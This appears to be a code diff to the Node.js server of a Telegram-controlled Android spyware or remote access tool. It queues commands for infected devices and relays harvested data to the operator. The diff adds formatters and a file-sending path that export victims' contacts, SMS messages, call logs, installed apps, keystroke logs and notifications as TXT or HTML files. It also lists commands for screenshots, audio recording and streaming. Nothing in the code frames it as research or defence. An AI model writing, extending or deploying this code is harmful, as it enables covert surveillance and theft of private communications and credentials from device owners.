@@ -44,7 +44,6 @@ async function sendTelegramMessage(chatId, text) {
 
         console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
         
-        // Use HTML parse_mode which is more forgiving
         const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
             text: text,
@@ -56,13 +55,12 @@ async function sendTelegramMessage(chatId, text) {
     } catch (error) {
         console.error('❌ Error sending message:', error.response?.data || error.message);
         
-        // If HTML fails, try without formatting
         if (error.response?.status === 400) {
             console.log('⚠️ HTML failed, retrying as plain text');
             try {
                 const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                     chat_id: chatId,
-                    text: text.replace(/<[^>]*>/g, '') // Strip HTML tags
+                    text: text.replace(/<[^>]*>/g, '')
                 });
                 return response.data;
             } catch (e) {
@@ -71,6 +69,385 @@ async function sendTelegramMessage(chatId, text) {
         }
         return null;
     }
+}
+
+async function sendTelegramDocument(chatId, content, filename, caption) {
+    try {
+        console.log(`📎 Sending document ${filename} to ${chatId}`);
+        
+        // Create a buffer from the content
+        const buffer = Buffer.from(content, 'utf-8');
+        
+        // Create form data
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', new Blob([buffer]), filename);
+        formData.append('caption', caption);
+        
+        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
+            headers: {
+                'Content-Type': 'multipart/form-data'
+            }
+        });
+        
+        console.log(`✅ Document sent successfully to ${chatId}`);
+        return response.data;
+    } catch (error) {
+        console.error('❌ Error sending document:', error.response?.data || error.message);
+        return null;
+    }
+}
+
+// ============= FILE FORMATTERS =============
+
+function formatContactsAsHTML(contacts) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Contacts Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }
+        .contact { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .name { font-size: 18px; font-weight: bold; color: #4CAF50; }
+        .number { font-size: 16px; color: #666; margin-top: 5px; }
+        .count { background: #4CAF50; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>📇 Contacts Export</h1>
+    <div class="count">Total Contacts: ${contacts.length}</div>
+    <hr>`;
+
+    contacts.forEach((contact, index) => {
+        html += `
+    <div class="contact">
+        <div class="name">${index + 1}. ${contact.name || 'Unknown'}</div>
+        <div class="number">📞 ${contact.number || 'No number'}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatContactsAsTXT(contacts) {
+    let text = "📇 CONTACTS EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Contacts: ${contacts.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    contacts.forEach((contact, index) => {
+        text += `${index + 1}. Name: ${contact.name || 'Unknown'}\n`;
+        text += `   Phone: ${contact.number || 'No number'}\n`;
+        text += "-".repeat(30) + "\n";
+    });
+
+    return text;
+}
+
+function formatSMSAsHTML(messages) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SMS Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #2196F3; padding-bottom: 10px; }
+        .message { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .incoming { border-left: 4px solid #4CAF50; }
+        .sent { border-left: 4px solid #2196F3; }
+        .address { font-size: 16px; font-weight: bold; color: #333; }
+        .body { font-size: 14px; color: #666; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; }
+        .time { font-size: 12px; color: #999; margin-top: 5px; }
+        .count { background: #2196F3; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>💬 SMS Messages Export</h1>
+    <div class="count">Total Messages: ${messages.length}</div>
+    <hr>`;
+
+    messages.forEach((msg, index) => {
+        const typeClass = msg.type === 'INBOX' ? 'incoming' : 'sent';
+        const typeIcon = msg.type === 'INBOX' ? '📥' : '📤';
+        const date = new Date(parseInt(msg.date));
+        
+        html += `
+    <div class="message ${typeClass}">
+        <div class="address">${typeIcon} ${msg.address}</div>
+        <div class="body">${msg.body.replace(/\n/g, '<br>')}</div>
+        <div class="time">${date.toLocaleString()}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatSMSAsTXT(messages) {
+    let text = "💬 SMS MESSAGES EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Messages: ${messages.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    messages.forEach((msg, index) => {
+        const type = msg.type === 'INBOX' ? 'INCOMING' : 'SENT';
+        const date = new Date(parseInt(msg.date));
+        
+        text += `[${index + 1}] ${type} - ${date.toLocaleString()}\n`;
+        text += `From/To: ${msg.address}\n`;
+        text += `Message: ${msg.body}\n`;
+        text += "-".repeat(40) + "\n\n";
+    });
+
+    return text;
+}
+
+function formatCallLogsAsHTML(calls) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Call Logs Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #FF9800; padding-bottom: 10px; }
+        .call { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .incoming { border-left: 4px solid #4CAF50; }
+        .outgoing { border-left: 4px solid #2196F3; }
+        .missed { border-left: 4px solid #f44336; }
+        .number { font-size: 16px; font-weight: bold; color: #333; }
+        .details { font-size: 14px; color: #666; margin-top: 5px; }
+        .time { font-size: 12px; color: #999; margin-top: 5px; }
+        .count { background: #FF9800; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>📞 Call Logs Export</h1>
+    <div class="count">Total Calls: ${calls.length}</div>
+    <hr>`;
+
+    calls.forEach((call, index) => {
+        const typeClass = call.type === 'INCOMING' ? 'incoming' : (call.type === 'OUTGOING' ? 'outgoing' : 'missed');
+        const typeIcon = call.type === 'INCOMING' ? '⬇️' : (call.type === 'OUTGOING' ? '⬆️' : '❌');
+        const date = new Date(parseInt(call.date));
+        const caller = call.name || call.number;
+        
+        html += `
+    <div class="call ${typeClass}">
+        <div class="number">${typeIcon} ${caller}</div>
+        <div class="details">Type: ${call.type} | Duration: ${call.duration}s</div>
+        <div class="time">${date.toLocaleString()}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatCallLogsAsTXT(calls) {
+    let text = "📞 CALL LOGS EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Calls: ${calls.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    calls.forEach((call, index) => {
+        const date = new Date(parseInt(call.date));
+        const caller = call.name || call.number;
+        
+        text += `[${index + 1}] ${call.type} Call\n`;
+        text += `Number: ${caller}\n`;
+        text += `Duration: ${call.duration} seconds\n`;
+        text += `Time: ${date.toLocaleString()}\n`;
+        text += "-".repeat(40) + "\n\n";
+    });
+
+    return text;
+}
+
+function formatAppsAsHTML(apps) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Installed Apps Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #9C27B0; padding-bottom: 10px; }
+        .app { background: white; margin: 5px 0; padding: 10px 15px; border-radius: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .system { background: #e3f2fd; }
+        .user { background: #f1f8e9; }
+        .name { font-size: 14px; font-weight: bold; color: #333; }
+        .package { font-size: 12px; color: #666; font-family: monospace; }
+        .count { background: #9C27B0; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>📱 Installed Apps Export</h1>
+    <div class="count">Total Apps: ${apps.length}</div>
+    <hr>`;
+
+    apps.forEach((app, index) => {
+        const isSystem = app.isSystem === 'true';
+        const appClass = isSystem ? 'system' : 'user';
+        const icon = isSystem ? '⚙️' : '📱';
+        
+        html += `
+    <div class="app ${appClass}">
+        <div class="name">${icon} ${app.name}</div>
+        <div class="package">${app.package}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatAppsAsTXT(apps) {
+    let text = "📱 INSTALLED APPS EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Apps: ${apps.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    apps.forEach((app, index) => {
+        const type = app.isSystem === 'true' ? '[SYSTEM]' : '[USER]';
+        text += `${index + 1}. ${type} ${app.name}\n`;
+        text += `   Package: ${app.package}\n`;
+    });
+
+    return text;
+}
+
+function formatKeystrokesAsHTML(keystrokes) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Keystroke Logs Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #607D8B; padding-bottom: 10px; }
+        .keystroke { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .app { font-size: 14px; color: #607D8B; font-weight: bold; }
+        .text { font-size: 14px; color: #333; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 5px; font-family: monospace; }
+        .time { font-size: 12px; color: #999; margin-top: 5px; }
+        .count { background: #607D8B; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>⌨️ Keystroke Logs Export</h1>
+    <div class="count">Total Keystrokes: ${keystrokes.length}</div>
+    <hr>`;
+
+    keystrokes.forEach((log, index) => {
+        const date = new Date(log.timestamp);
+        const app = log.packageName || 'unknown';
+        
+        html += `
+    <div class="keystroke">
+        <div class="app">📱 ${app}</div>
+        <div class="text">${log.data || ''}</div>
+        <div class="time">${date.toLocaleString()}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatKeystrokesAsTXT(keystrokes) {
+    let text = "⌨️ KEYSTROKE LOGS EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Keystrokes: ${keystrokes.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    keystrokes.forEach((log, index) => {
+        const date = new Date(log.timestamp);
+        text += `[${index + 1}] ${date.toLocaleString()}\n`;
+        text += `App: ${log.packageName || 'unknown'}\n`;
+        text += `Text: ${log.data || ''}\n`;
+        text += "-".repeat(40) + "\n\n";
+    });
+
+    return text;
+}
+
+function formatNotificationsAsHTML(notifications) {
+    let html = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Notifications Export</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        h1 { color: #333; border-bottom: 2px solid #FF5722; padding-bottom: 10px; }
+        .notification { background: white; margin: 10px 0; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-left: 4px solid #FF5722; }
+        .app { font-size: 14px; color: #FF5722; font-weight: bold; }
+        .title { font-size: 16px; font-weight: bold; color: #333; margin-top: 5px; }
+        .text { font-size: 14px; color: #666; margin-top: 10px; }
+        .time { font-size: 12px; color: #999; margin-top: 5px; }
+        .count { background: #FF5722; color: white; padding: 5px 10px; border-radius: 5px; display: inline-block; }
+    </style>
+</head>
+<body>
+    <h1>🔔 Notifications Export</h1>
+    <div class="count">Total Notifications: ${notifications.length}</div>
+    <hr>`;
+
+    notifications.forEach((log, index) => {
+        const date = new Date(log.timestamp);
+        const app = log.packageName || 'unknown';
+        
+        html += `
+    <div class="notification">
+        <div class="app">📱 ${app}</div>
+        <div class="title">${log.title || ''}</div>
+        <div class="text">${log.data || ''}</div>
+        <div class="time">${date.toLocaleString()}</div>
+    </div>`;
+    });
+
+    html += `
+</body>
+</html>`;
+    return html;
+}
+
+function formatNotificationsAsTXT(notifications) {
+    let text = "🔔 NOTIFICATIONS EXPORT\n";
+    text += "=".repeat(50) + "\n";
+    text += `Total Notifications: ${notifications.length}\n`;
+    text += "=".repeat(50) + "\n\n";
+
+    notifications.forEach((log, index) => {
+        const date = new Date(log.timestamp);
+        text += `[${index + 1}] ${date.toLocaleString()}\n`;
+        text += `App: ${log.packageName || 'unknown'}\n`;
+        if (log.title) text += `Title: ${log.title}\n`;
+        if (log.data) text += `Content: ${log.data}\n`;
+        text += "-".repeat(40) + "\n\n";
+    });
+
+    return text;
 }
 
 // ============= COMMAND HELPERS =============
@@ -86,52 +463,37 @@ function getHelpMessage() {
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
 
-<b>📸 SCREENSHOT SIZE COMMANDS - SIMPLIFIED</b>
-<b>▶️ THREE SIMPLE SIZE OPTIONS:</b>
-/small - <b>SMALL SIZE</b> - Max compression, smallest files (~90% smaller)
-       Quality: 30% | Resolution: 25% | Grayscale: ON | Color Reduction: ON
-       <i>Perfect for quick previews, slow connections</i>
+<b>📸 SCREENSHOT SIZE COMMANDS</b>
+/small - Max compression, smallest files
+/medium - Balanced quality/size
+/original - Best quality, largest files
+/size_status - Check current size setting
+/screenshot_settings - View all settings
 
-/medium - <b>MEDIUM SIZE</b> - Balanced quality/size (DEFAULT)
-        Quality: 60% | Resolution: 50% | Format: WEBP
-        <i>Best for daily use, good balance</i>
-
-/original - <b>ORIGINAL SIZE</b> - Best quality, largest files
-          Quality: 90% | Resolution: 100% | Format: JPEG
-          <i>When quality matters most</i>
-
-/size_status - Check current screenshot size setting
-/screenshot_settings - View all current screenshot settings
-
-<b>📸 ADVANCED SCREENSHOT COMMANDS</b>
-/screenshot - Take a screenshot NOW (with current size setting)
-/auto_on - Enable auto-screenshot when apps open
-/auto_off - Disable auto-screenshot
-/auto_status - Check auto-screenshot settings
-/auto_interval [seconds] - Set time between screenshots
-/auto_max [number] - Set max screenshots per session
-/add_target [package] - Add app to monitor
-/remove_target [package] - Remove app from monitoring
-/target_apps - List all monitored apps
-
-<b>📱 DATA EXTRACTION COMMANDS - RETURNS ACTUAL CONTENT</b>
-/contacts - Get full contact list with names and numbers
-/calllogs - Get recent call logs with details
-/sms - Get recent SMS messages with content
-/apps - List all installed apps
-/keystrokes - Get recent keystroke logs
-/notifications - Get recent notifications with content
+<b>📱 DATA EXTRACTION COMMANDS - RETURNS AS FILES</b>
+/contacts_txt - Get contacts as TXT file
+/contacts_html - Get contacts as HTML file
+/sms_txt - Get SMS messages as TXT file
+/sms_html - Get SMS messages as HTML file
+/calllogs_txt - Get call logs as TXT file
+/calllogs_html - Get call logs as HTML file
+/apps_txt - Get apps list as TXT file
+/apps_html - Get apps list as HTML file
+/keystrokes_txt - Get keystrokes as TXT file
+/keystrokes_html - Get keystrokes as HTML file
+/notifications_txt - Get notifications as TXT file
+/notifications_html - Get notifications as HTML file
 
 <b>🎤 RECORDING COMMANDS</b>
-/record - Start 60s audio recording NOW
-/start_recording - Start scheduled recording service
+/record - Start 60s audio recording
+/start_recording - Start scheduled recording
 /stop_recording - Stop recording service
 
-<b>⚙️ SERVICE CONTROL COMMANDS</b>
+<b>⚙️ SERVICE CONTROL</b>
 /start_screenshot - Start screenshot service
 /stop_screenshot - Stop screenshot service
-/start_stream - Start streaming service
-/stop_stream - Stop streaming service
+/start_stream - Start streaming
+/stop_stream - Stop streaming
 /reboot_app - Restart all services
 
 <b>🛠️ UTILITY COMMANDS</b>
@@ -147,28 +509,17 @@ function getHelpMessage() {
 /stats - Get detailed statistics
 /clear_logs - Clear all logs
 
-<b>📋 SIZE COMPARISON (1080p screenshot)</b>
-• /small - ~20-50 KB - Fast transmission
-• /medium - ~100-200 KB - Good balance
-• /original - ~500 KB - 2 MB - Best quality
-
-<b>📋 COMMAND EXAMPLES</b>
-• /contacts - Shows actual contacts list
-• /sms - Shows actual SMS messages
-• /calllogs - Shows actual call history
-• /storage - Shows storage usage
-• /network - Shows network details
-
-For more help, visit the dashboard at http://127.0.0.1:8080`;
+<b>📋 FILE FORMATS</b>
+• TXT files - Simple text format
+• HTML files - Formatted with styling
+All files are sent as downloadable documents`;
 }
 
 // ============= WEBHOOK ENDPOINT =============
 
 app.post('/webhook', async (req, res) => {
-    // Send 200 OK immediately
     res.sendStatus(200);
     
-    // Process asynchronously
     setImmediate(async () => {
         try {
             const update = req.body;
@@ -183,14 +534,12 @@ app.post('/webhook', async (req, res) => {
             const text = update.message.text;
             const messageId = update.message.message_id;
 
-            // Check authorization
             if (!isAuthorizedChat(chatId)) {
                 console.log(`⛔ Unauthorized chat: ${chatId}`);
                 await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                 return;
             }
 
-            // Handle commands
             if (text?.startsWith('/')) {
                 await handleCommand(chatId, text, messageId);
             }
@@ -206,7 +555,6 @@ async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
     console.log(`📊 Devices in memory: ${devices.size}`);
 
-    // Handle help immediately - no device needed
     if (command === '/help' || command === '/start') {
         console.log('📋 Sending help menu directly from server');
         const helpMessage = getHelpMessage();
@@ -215,7 +563,6 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
-    // Find device for this chat
     let deviceId = null;
     let device = null;
     
@@ -235,10 +582,8 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
-    // Update last seen
     device.lastSeen = Date.now();
 
-    // Queue command for device (remove leading slash)
     const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
     
     if (!device.pendingCommands) {
@@ -256,22 +601,20 @@ async function handleCommand(chatId, command, messageId) {
     console.log(`📝 Command queued:`, commandObject);
     console.log(`📊 Pending commands: ${device.pendingCommands.length}`);
 
-    // Acknowledge based on command type
     let ackMessage = `⏳ Processing: ${command}`;
     
-    // Custom acknowledgments for different command types
-    if (cleanCommand === 'contacts') {
-        ackMessage = `📇 Fetching your contacts... This may take a moment.`;
-    } else if (cleanCommand === 'sms') {
-        ackMessage = `💬 Retrieving SMS messages...`;
-    } else if (cleanCommand === 'calllogs' || cleanCommand === 'call_logs') {
-        ackMessage = `📞 Getting call history...`;
-    } else if (cleanCommand === 'apps') {
-        ackMessage = `📱 Listing installed apps...`;
-    } else if (cleanCommand === 'keystrokes') {
-        ackMessage = `⌨️ Fetching keystroke logs...`;
-    } else if (cleanCommand === 'notifications') {
-        ackMessage = `🔔 Getting recent notifications...`;
+    if (cleanCommand.includes('contacts')) {
+        ackMessage = `📇 Generating contacts file...`;
+    } else if (cleanCommand.includes('sms')) {
+        ackMessage = `💬 Generating SMS file...`;
+    } else if (cleanCommand.includes('calllogs')) {
+        ackMessage = `📞 Generating call logs file...`;
+    } else if (cleanCommand.includes('apps')) {
+        ackMessage = `📱 Generating apps list file...`;
+    } else if (cleanCommand.includes('keystrokes')) {
+        ackMessage = `⌨️ Generating keystrokes file...`;
+    } else if (cleanCommand.includes('notifications')) {
+        ackMessage = `🔔 Generating notifications file...`;
     } else if (cleanCommand === 'storage') {
         ackMessage = `💾 Calculating storage usage...`;
     } else if (cleanCommand === 'network') {
@@ -285,7 +628,6 @@ async function handleCommand(chatId, command, messageId) {
 
 // ============= API ENDPOINTS =============
 
-// Health check
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'healthy', 
@@ -295,7 +637,6 @@ app.get('/health', (req, res) => {
     });
 });
 
-// Ping endpoint for keep-alive
 app.get('/api/ping/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     console.log(`💓 Ping from device ${deviceId}`);
@@ -310,7 +651,6 @@ app.get('/api/ping/:deviceId', (req, res) => {
     }
 });
 
-// Get pending commands for device
 app.get('/api/commands/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
@@ -321,7 +661,6 @@ app.get('/api/commands/:deviceId', (req, res) => {
             device.pendingCommands = [];
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
             
-            // Log the commands being sent
             commands.forEach(cmd => {
                 console.log(`   └─ ${cmd.command}`);
             });
@@ -336,38 +675,95 @@ app.get('/api/commands/:deviceId', (req, res) => {
     }
 });
 
-// Receive command result from device
 app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
-    const { command, result, error } = req.body;
+    const { command, result, error, dataType, content } = req.body;
     
-    console.log(`📨 Result from ${deviceId}:`, { command, result: result ? result.substring(0, 50) + '...' : null, error });
+    console.log(`📨 Result from ${deviceId}:`, { command, dataType, contentLength: content?.length });
     
     const device = devices.get(deviceId);
     if (device) {
         const chatId = device.chatId;
         
-        // Format the message nicely
-        let message;
         if (error) {
-            message = `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`;
-        } else {
-            // Check if result contains special formatting
-            if (result) {
-                // For data extraction commands, just pass through the formatted result
-                message = result;
-            } else {
-                message = `✅ <b>Command Executed</b>\n\n<code>${command}</code>`;
+            await sendTelegramMessage(chatId, `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
+        } else if (dataType && content) {
+            // Handle file responses
+            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            let filename, caption;
+            
+            switch (dataType) {
+                case 'contacts_txt':
+                    filename = `contacts_${timestamp}.txt`;
+                    caption = `📇 Contacts Export (${content.length} contacts)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'contacts_html':
+                    filename = `contacts_${timestamp}.html`;
+                    caption = `📇 Contacts Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'sms_txt':
+                    filename = `sms_${timestamp}.txt`;
+                    caption = `💬 SMS Export (${content.length} messages)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'sms_html':
+                    filename = `sms_${timestamp}.html`;
+                    caption = `💬 SMS Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'calllogs_txt':
+                    filename = `call_logs_${timestamp}.txt`;
+                    caption = `📞 Call Logs Export (${content.length} calls)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'calllogs_html':
+                    filename = `call_logs_${timestamp}.html`;
+                    caption = `📞 Call Logs Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'apps_txt':
+                    filename = `apps_${timestamp}.txt`;
+                    caption = `📱 Apps List Export (${content.length} apps)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'apps_html':
+                    filename = `apps_${timestamp}.html`;
+                    caption = `📱 Apps List Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'keystrokes_txt':
+                    filename = `keystrokes_${timestamp}.txt`;
+                    caption = `⌨️ Keystrokes Export (${content.length} entries)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'keystrokes_html':
+                    filename = `keystrokes_${timestamp}.html`;
+                    caption = `⌨️ Keystrokes Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'notifications_txt':
+                    filename = `notifications_${timestamp}.txt`;
+                    caption = `🔔 Notifications Export (${content.length} notifications)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                case 'notifications_html':
+                    filename = `notifications_${timestamp}.html`;
+                    caption = `🔔 Notifications Export (HTML)`;
+                    await sendTelegramDocument(chatId, content, filename, caption);
+                    break;
+                default:
+                    await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
             }
+        } else {
+            await sendTelegramMessage(chatId, result || `✅ ${command} executed`);
         }
-        
-        await sendTelegramMessage(chatId, message);
     }
     
     res.sendStatus(200);
 });
 
-// Register device
 app.post('/api/register', async (req, res) => {
     const { deviceId, chatId, deviceInfo } = req.body;
     
@@ -394,7 +790,6 @@ app.post('/api/register', async (req, res) => {
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
     console.log(`📊 Total devices: ${devices.size}`);
     
-    // Send confirmation with all available commands
     await sendTelegramMessage(chatId, 
         `✅ <b>Device Connected!</b>\n\n` +
         `Model: ${deviceInfo.model}\n` +
@@ -402,26 +797,31 @@ app.post('/api/register', async (req, res) => {
         `Battery: ${deviceInfo.battery}\n` +
         `ID: ${deviceId.substring(0, 8)}...\n\n` +
         `<b>📸 Screenshot Size Options:</b>\n` +
-        `• /small - Max compression (20-50 KB)\n` +
-        `• /medium - Balanced (100-200 KB)\n` +
-        `• /original - Best quality (500 KB+)\n\n` +
-        `<b>📱 Data Extraction Commands:</b>\n` +
-        `• /contacts - Get full contact list\n` +
-        `• /sms - Get SMS messages\n` +
-        `• /calllogs - Get call history\n` +
-        `• /apps - List installed apps\n` +
-        `• /keystrokes - Get keystroke logs\n` +
-        `• /notifications - Get notifications\n\n` +
+        `• /small - Max compression\n` +
+        `• /medium - Balanced\n` +
+        `• /original - Best quality\n\n` +
+        `<b>📱 Data Extraction (as files):</b>\n` +
+        `• /contacts_txt - Contacts (TXT)\n` +
+        `• /contacts_html - Contacts (HTML)\n` +
+        `• /sms_txt - SMS (TXT)\n` +
+        `• /sms_html - SMS (HTML)\n` +
+        `• /calllogs_txt - Call logs (TXT)\n` +
+        `• /calllogs_html - Call logs (HTML)\n` +
+        `• /apps_txt - Apps list (TXT)\n` +
+        `• /apps_html - Apps list (HTML)\n` +
+        `• /keystrokes_txt - Keystrokes (TXT)\n` +
+        `• /keystrokes_html - Keystrokes (HTML)\n` +
+        `• /notifications_txt - Notifications (TXT)\n` +
+        `• /notifications_html - Notifications (HTML)\n\n` +
         `<b>🔍 Info Commands:</b>\n` +
         `• /storage - Storage usage\n` +
         `• /network - Network details\n` +
         `• /screenshot_settings - Current settings\n\n` +
-        `Current size: <b>MEDIUM</b> (default)`);
+        `Current size: <b>MEDIUM</b>`);
     
     res.json({ status: 'registered', deviceId });
 });
 
-// List all devices
 app.get('/api/devices', (req, res) => {
     const deviceList = [];
     for (const [id, device] of devices.entries()) {
@@ -437,7 +837,6 @@ app.get('/api/devices', (req, res) => {
     res.json({ total: devices.size, devices: deviceList });
 });
 
-// Debug endpoint
 app.get('/api/debug/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const device = devices.get(deviceId);
@@ -455,7 +854,6 @@ app.get('/api/debug/:deviceId', (req, res) => {
     }
 });
 
-// Test endpoints
 app.get('/test', (req, res) => {
     res.send(`
         <html>
@@ -464,7 +862,7 @@ app.get('/test', (req, res) => {
             <p><b>Time:</b> ${new Date().toISOString()}</p>
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
-            <p><b>Available Commands:</b> /contacts, /sms, /calllogs, /apps, /keystrokes, /notifications, /storage, /network, /screenshot_settings</p>
+            <p><b>Commands return files:</b> /contacts_txt, /contacts_html, /sms_txt, /sms_html, /calllogs_txt, /calllogs_html</p>
             <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
         </body>
         </html>
@@ -478,22 +876,23 @@ app.get('/test-help', async (req, res) => {
     res.json({ success: !!result, result });
 });
 
-// ============= START SERVER =============
-
 app.listen(PORT, '0.0.0.0', () => {
     console.log('\n🚀 ===============================================');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('\n📱 NEW DATA EXTRACTION COMMANDS:');
-    console.log('   └─ /contacts     - Returns actual contact list');
-    console.log('   └─ /sms          - Returns actual SMS messages');
-    console.log('   └─ /calllogs     - Returns actual call history');
-    console.log('   └─ /apps         - Returns installed apps list');
-    console.log('   └─ /keystrokes   - Returns keystroke logs');
-    console.log('   └─ /notifications- Returns notifications');
-    console.log('   └─ /storage      - Storage usage details');
-    console.log('   └─ /network      - Network information');
-    console.log('   └─ /screenshot_settings - Current settings');
+    console.log('\n📱 NEW FILE-BASED COMMANDS:');
+    console.log('   └─ /contacts_txt     - Contacts as TXT file');
+    console.log('   └─ /contacts_html    - Contacts as HTML file');
+    console.log('   └─ /sms_txt          - SMS as TXT file');
+    console.log('   └─ /sms_html         - SMS as HTML file');
+    console.log('   └─ /calllogs_txt     - Call logs as TXT file');
+    console.log('   └─ /calllogs_html    - Call logs as HTML file');
+    console.log('   └─ /apps_txt         - Apps as TXT file');
+    console.log('   └─ /apps_html        - Apps as HTML file');
+    console.log('   └─ /keystrokes_txt   - Keystrokes as TXT file');
+    console.log('   └─ /keystrokes_html  - Keystrokes as HTML file');
+    console.log('   └─ /notifications_txt - Notifications as TXT file');
+    console.log('   └─ /notifications_html - Notifications as HTML file');
     console.log('\n🚀 ===============================================\n');
 });
